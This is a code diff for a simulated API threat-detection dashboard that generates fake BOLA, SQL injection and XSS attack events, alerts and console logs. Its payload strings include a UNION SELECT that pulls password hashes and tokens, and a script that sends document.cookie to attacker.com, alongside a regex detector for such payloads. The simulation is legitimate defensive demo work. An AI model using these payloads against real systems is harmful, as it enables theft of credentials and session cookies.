+                const reqObj = {
+                    id: State.requests.length + 1,
+                    request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                    timestamp: timeStr,
+                    full_time: now.toISOString().replace('T', ' ').slice(0, 19),
+                    method: 'GET',
+                    endpoint: '/api/v1/admin/users/export',
+                    status_code: 403,
+                    response_time_ms: 140,
+                    payload_size: 380,
+                    classification: 'Potential Attack',
+                    risk_score: 82,
+                    ip_address: '185.220.101.5',
+                    threat_type: 'BOLA / Unauthorized Probe',
+                    is_blocked: true,
+                    user_agent: 'curl/8.4.0',
+                    anomaly_score: '76.5',
+                    reasons: 'Unauthenticated or invalid token access attempt on high-value sensitive endpoint; Access denied with HTTP 403'
+                };
+                State.requests.push(reqObj);
+                newAlert = {
+                    id: State.alerts.length + 1,
+                    alert_id: 'ALT-' + Math.random().toString(36).substring(2, 7).toUpperCase(),
+                    alert_title: 'BOLA / Broken Object Level Auth Probe',
+                    category: 'Access Control',
+                    severity: 'High',
+                    source_ip: '185.220.101.5',
+                    endpoint: '/api/v1/admin/users/export',
+                    risk_score: 82,
+                    timestamp: timeStr,
+                    description: 'Client presented untrusted/forged bearer token attempting to access administrative user directory export.',
+                    recommended_action: 'Revoke active token signing keys, invalidate suspect session, and audit RBAC middleware.',
+                    status: 'Active'
+                };
+                State.alerts.unshift(newAlert);
+                appendConsole(`[DISPATCH] GET /api/v1/admin/users/export - Forged JWT Bearer Token from 185.220.101.5`, 'cmd');
+                appendConsole(`[ALERT] BOLA Probe Detected! Risk Score: 82/100 - Access Denied (403)`, 'warning');
+                showNotification('High Risk Alert', 'BOLA Probe Detected on /api/v1/admin (Risk Score: 82)', 'warning');
+
+            } else if (type.startsWith('payload')) {
+                const isSQLi = type === 'payload_sqli';
+                const payloadStr = isSQLi ? "'; UNION SELECT username, password_hash, token FROM users WHERE '1'='1" : "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>";
+                const threatName = isSQLi ? 'SQL Injection (SQLi) Attempt' : 'Cross-Site Scripting (XSS) Injection';
+
+                const reqObj = {
+                    id: State.requests.length + 1,
+                    request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                    timestamp: timeStr,
+                    full_time: now.toISOString().replace('T', ' ').slice(0, 19),
+                    method: 'POST',
+                    endpoint: isSQLi ? '/api/v1/users/search' : '/api/v1/comments',
+                    status_code: 400,
+                    response_time_ms: 185,
+                    payload_size: payloadStr.length + 120,
+                    classification: 'Potential Attack',
+                    risk_score: 96,
+                    ip_address: isSQLi ? '45.33.32.156' : '194.26.29.112',
+                    threat_type: threatName,
+                    is_blocked: true,
+                    user_agent: 'PostmanRuntime/7.36.0',
+                    anomaly_score: '94.2',
+                    reasons: `Dangerous payload signatures detected (Score: 8.5/10); ${isSQLi ? 'SQL injection union regex pattern' : 'XSS script injection tag pattern'}`
+                };
+                State.requests.push(reqObj);
+                newAlert = {
+                    id: State.alerts.length + 1,
+                    alert_id: 'ALT-' + Math.random().toString(36).substring(2, 7).toUpperCase(),
+                    alert_title: `${threatName} Detected in Request Body`,
+                    category: 'Injection',
+                    severity: 'Critical',
+                    source_ip: reqObj.ip_address,
+                    endpoint: reqObj.endpoint,
+                    risk_score: 96,
+                    timestamp: timeStr,
+                    description: `Payload heuristic analyzer flagged suspicious regex signature in request data: [${payloadStr.slice(0, 50)}...]. Potential code execution.`,
+                    recommended_action: 'Block client IP immediately at WAF, inspect ORM query sanitization layers, and verify input escaping.',
+                    status: 'Active'
+                };
+                State.alerts.unshift(newAlert);
+                appendConsole(`[DISPATCH] POST ${reqObj.endpoint} - Malicious Injection: ${payloadStr.slice(0, 45)}...`, 'cmd');
+                appendConsole(`[HEURISTIC] Regex Pattern Match: Score 8.5/10!`, 'danger');
+                appendConsole(`[ALERT] Critical Alert ${newAlert.alert_id}! Risk Score: 96/100 - BLOCKED AT WAF`, 'danger');
+                showNotification('Critical Alert Raised', `${threatName} identified and dropped (Risk Score: 96)`, 'danger');
             }
+
+            // Update Timeline Chart
+            const lastReq = State.requests[State.requests.length - 1];
+            if (State.trafficChart) {
+                State.trafficChart.data.labels.push(lastReq.timestamp);
+                State.trafficChart.data.datasets[0].data.push(lastReq.risk_score);
+                State.trafficChart.data.datasets[1].data.push(lastReq.response_time_ms);
+                if (State.trafficChart.data.labels.length > 15) {
+                    State.trafficChart.data.labels.shift();
+                    State.trafficChart.data.datasets[0].data.shift();
+                    State.trafficChart.data.datasets[1].data.shift();
+                }
+                State.trafficChart.update();
+            }
+
+            // Add simulation log
+            State.simulations.unshift({
+                time: timeStr,
+                scenario: type.replace('_', ' ').toUpperCase(),
+                risk: lastReq.risk_score,
+                details: `Simulated attack scenario: ${lastReq.endpoint}`
+            });
+
+            renderAll();
+        }
+
+        function handleCustomSubmit(e) {
+            e.preventDefault();
+            const method = document.getElementById('cMethod').value;
+            const endpoint = document.getElementById('cEndpoint').value;
+            const ip = document.getElementById('cIp').value;
+            const status = parseInt(document.getElementById('cStatus').value) || 200;
+            const payload = document.getElementById('cPayload').value;
+
+            // Simple heuristic calculation
+            let pRisk = 0;
+            if (/UNION|SELECT|--|<script>|onerror/i.test(payload)) pRisk = 8.5;
+            const risk = pRisk > 5 ? 94 : (status >= 400 ? 55 : 15);
+            const cls = risk >= 80 ? 'Potential Attack' : (risk >= 30 ? 'Suspicious' : 'Normal');
+
+            const reqObj = {
+                id: State.requests.length + 1,
+                request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                timestamp: new Date().toLocaleTimeString(),
+                full_time: new Date().toISOString().replace('T', ' ').slice(0, 19),
+                method: method,
+                endpoint: endpoint,
+                status_code: status,
+                response_time_ms: 65,
+                payload_size: payload.length + 100,
+                classification: cls,
+                risk_score: risk,
+                ip_address: ip,
+                threat_type: pRisk > 5 ? 'Custom Injection Payload' : 'None',
+                is_blocked: risk >= 80,
+                user_agent: 'Custom-API-Client/1.0',
+                anomaly_score: (risk * 0.9).toFixed(1),
+                reasons: pRisk > 5 ? 'Dangerous payload signatures detected in custom payload' : 'Standard API request profile'
+            };
+
+            State.requests.push(reqObj);
+            bootstrap.Modal.getInstance(document.getElementById('customRequestModal')).hide();
+            showNotification('Request Ingested', `AI Evaluation: Risk ${risk}/100 (${cls})`, risk >= 80 ? 'danger' : 'success');
+            renderAll();
+        }
+
+        function renderLogsTable() {
+            const list = State.filteredLogs || State.logs;
+            document.getElementById('logsTableBody').innerHTML = list.map(l => `
+                <tr>
+                    <td class="font-mono small text-muted">${l.timestamp}</td>
+                    <td><span class="badge ${getLogTypeBadge(l.event_type)} font-mono">${l.event_type}</span></td>
+                    <td class="font-mono text-cyan small">${escapeHtml(l.source_ip)}</td>
+                    <td class="font-mono small text-light">${escapeHtml(l.endpoint)}</td>
+                    <td class="font-mono ${getRiskColorClass(l.risk_score)} fw-bold">${l.risk_score}</td>
+                    <td class="small text-light">${escapeHtml(l.detection_result)}</td>
+                    <td class="small text-muted font-mono">${escapeHtml(l.action_taken)}</td>
+                </tr>
+            `).join('');
+        }
+
+        function filterLogs() {
+            const q = (document.getElementById('logSearch')?.value || '').toLowerCase();
+            const type = document.getElementById('logTypeFilter')?.value || 'ALL';
+
+            State.filteredLogs = State.logs.filter(l => {
+                const matchQ = !q || l.source_ip.includes(q) || l.endpoint.toLowerCase().includes(q) || l.detection_result.toLowerCase().includes(q);
+                const matchT = type === 'ALL' || l.event_type === type;
+                return matchQ && matchT;
+            });
+
+            renderLogsTable();
+        }
+
+        function renderSimHistory() {
+            document.getElementById('simHistoryTbody').innerHTML = State.simulations.slice(0, 6).map(s => `
+                <tr>
+                    <td class="font-mono text-cyan small">${s.time}</td>
+                    <td><span class="badge bg-secondary font-mono">${escapeHtml(s.scenario)}</span></td>
+                    <td class="font-mono ${getRiskColorClass(s.risk)} fw-bold">${s.risk}</td>
+                    <td class="small text-light">${escapeHtml(s.details)}</td>
+                </tr>
+            `).join('');
+        }
+
+        function appendConsole(msg, lineClass = 'info') {
+            const consoleEl = document.getElementById('simConsole');
+            if (!consoleEl) return;
+            const time = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `console-line ${lineClass}`;
+            div.innerHTML = `<span class="text-muted">[${time}]</span> ${escapeHtml(msg)}`;
+            consoleEl.appendChild(div);
             consoleEl.scrollTop = consoleEl.scrollHeight;
         }
 
-        function updateChart(score) {
-            const timeStr = new Date().toLocaleTimeString().slice(0, 5);
-            timelineLabels.push(timeStr);
-            riskData.push(score);
-            if (timelineLabels.length > 8) {
-                timelineLabels.shift();
-                riskData.shift();
+        function clearConsole() {
+            const el = document.getElementById('simConsole');
+            if (el) el.innerHTML = '<div class="console-line info"><span class="text-muted">[READY]</span> Console buffer cleared. Select any attack scenario button to simulate.</div>';
+        }
+
+        function refreshDashboard() {
+            showNotification('Telemetry Refreshed', 'Real-time metrics and charts synchronized.', 'info');
+            renderAll();
+        }
+
+        function resetData() {
+            if (!confirm('Reset all demonstration data to baseline?')) return;
+            initSampleData();
+            renderAll();
+            showNotification('Reset Complete', 'Database baseline restored.', 'success');
+        }
+
+        // Helpers
+        function getSeverityClass(sev) {
+            switch ((sev || '').toLowerCase()) {
+                case 'critical': return 'badge-critical';
+                case 'high': return 'badge-high';
+                case 'medium': return 'badge-medium';
+                default: return 'badge-low';
             }
-            chart.update();
+        }
+        function getClassificationClass(cls) {
+            switch ((cls || '').toLowerCase()) {
+                case 'potential attack': return 'badge-attack';
+                case 'suspicious': return 'badge-suspicious';
+                default: return 'badge-safe';
+            }
+        }
+        function getRiskColorClass(score) {
+            if (score >= 80) return 'text-crimson';
+            if (score >= 60) return 'text-amber';
+            if (score >= 30) return 'text-warning';
+            return 'text-emerald';
+        }
+        function getRiskFillClass(score) {
+            if (score >= 80) return 'risk-fill-critical';
+            if (score >= 60) return 'risk-fill-high';
+            if (score >= 30) return 'risk-fill-medium';
+            return 'risk-fill-low';
+        }
+        function getStatusBadgeClass(st) {
+            switch ((st || '').toLowerCase()) {
+                case 'active': return 'bg-danger';
+                case 'investigating': return 'bg-warning text-dark';
+                case 'mitigated': return 'bg-info text-dark';
+                case 'resolved': return 'bg-success';
+                default: return 'bg-secondary';
+            }
+        }
+        function getLogTypeBadge(type) {
+            switch ((type || '').toUpperCase()) {
+                case 'DETECTION': return 'bg-danger';
+                case 'BLOCK': return 'bg-danger';
+                case 'AUTH': return 'bg-primary';
+                case 'SIMULATION': return 'bg-info text-dark';
+                case 'SYSTEM': return 'bg-secondary';
+                default: return 'bg-dark';
+            }
+        }
+        function showNotification(title, message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            if (!container) return;
+            const toastId = 'toast-' + Math.random().toString(36).substring(2, 9);
+            const iconMap = {
+                success: 'bi-check-circle-fill text-emerald',
+                danger: 'bi-exclamation-triangle-fill text-crimson',
+                warning: 'bi-shield-exclamation text-amber',
+                info: 'bi-info-circle-fill text-cyan'
+            };
+            const toastHtml = `
+                <div id="${toastId}" class="toast align-items-center text-white bg-dark border border-secondary" role="alert" aria-live="assertive" aria-atomic="true">
+                    <div class="d-flex">
+                        <div class="toast-body d-flex align-items-center gap-2">
+                            <i class="bi ${iconMap[type] || iconMap.info} fs-5"></i>
+                            <div>
+                                <strong>${title}</strong>
+                                <div class="small text-light opacity-75">${message}</div>
+                            </div>
+                        </div>
+                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+                    </div>
+                </div>
+            `;
+            container.insertAdjacentHTML('beforeend', toastHtml);
+            const toastElem = document.getElementById(toastId);
+            const bsToast = new bootstrap.Toast(toastElem, { delay: 4000 });
+            bsToast.show();
+            toastElem.addEventListener('hidden.bs.toast', () => toastElem.remove());
+        }
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
         }
     </script>
 </body>
